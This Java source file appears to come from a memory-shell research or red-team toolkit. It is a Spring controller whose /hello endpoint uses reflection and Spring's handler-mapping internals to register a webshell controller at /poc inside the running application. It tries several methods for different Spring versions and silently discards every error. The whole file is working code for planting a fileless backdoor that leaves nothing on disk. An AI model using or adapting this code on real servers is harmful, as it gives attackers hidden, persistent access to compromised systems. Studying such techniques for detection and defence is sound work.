package com.memshell.spring;

import com.memshell.generic.Util;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.support.XmlWebApplicationContext;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

@Controller
public class ControllerBased{

    @RequestMapping("/hello")
    public String say() {
        System.out.println("[+] Hello, Spring");

        Class clazz = Util.getDynamicControllerTemplateClass();

        XmlWebApplicationContext context = null;
        try{
            context = (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        }catch(Exception e){
            context = (XmlWebApplicationContext)ContextLoader.getCurrentWebApplicationContext();
        }

        try{
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
            Method method = clazz.getDeclaredMethod("login", HttpServletRequest.class, HttpServletResponse.class);
            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/poc");
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, clazz.newInstance(), method);
        }catch(Exception e){
            //continue
        }

        try{
            // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
            context.getBeanFactory().registerSingleton("dynamicController", clazz.newInstance());
        }catch(Exception e){
            //continue
        }


        try{
            // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
            Object dh = context.getBean(Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping"));
            // 3. 反射获得 registerHandler Method
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping").getDeclaredMethod("registerHandler", String.class, Object.class);
            method.setAccessible(true);
            // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
            method.invoke(dh, "/poc", "dynamicController");
        }catch(Exception e){
            //continue
        }

        try{
            Object requestMappingHandlerMapping = context.getBean(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("detectHandlerMethods", Object.class);
            method.setAccessible(true);
            method.invoke(requestMappingHandlerMapping, "dynamicController");
        }catch(Exception e){
            //continue;
        }

        return "success";
    }
}